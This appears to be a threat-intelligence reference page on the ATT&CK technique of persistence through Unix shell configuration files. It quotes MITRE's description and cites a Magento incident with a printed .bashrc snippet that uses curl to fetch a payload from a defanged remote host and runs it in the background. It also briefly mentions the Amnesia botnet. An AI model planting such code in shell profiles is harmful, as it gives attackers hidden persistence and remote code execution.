---
title: "Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)"
date: 2022-06-23T20:27:39-04:00
draft: false
---

# Event Triggered Execution: Unix Shell Configuration Modification

[T1546.004](https://attack.mitre.org/techniques/T1546/004/)

*Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (`/etc`) and the user’s home directory (`~/`) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.*

*Adversaries may attempt to establish persistence by inserting commands 
into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the `/etc/profile` and `/etc/profile.d` files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into `~/.bash_profile`, `~/.bash_login`, or `~/.profile` which are sourced when a user opens a command-line interface or connects remotely.*

# Attack Vectors

### Magento

Malicious code was inserted within a site owner’s `.bashrc` file that downloads a JavaScript file from a remote location. This file loads whenever a user logs into a Unix account locally or through SSH. 

```bash
checks=$(ps aux | grep php-fpm | grep -v grep | grep tmp);

if [ "$checks" == "" ]; then

   rm -rf /tmp/.a /tmp/start_6457387765553057055;

   if ! [ -f /tmp/php-fpm ]; then

      curl -qs javascloud[.]com/victim_install.js > /tmp/php-fpm;

      chmod +x /tmp/php-fpm;

   fi

   /bin/sh /tmp/php-fpm > /dev/null 2>&1 &

Fi
```

**Amnesia - IoT/Linux Botnet**

Amnesia creates persistence files in `~/.bashrc` and `~/.bash_history`. 

# References

[https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html](https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html)

[https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/](https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/)

[https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/](https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/)
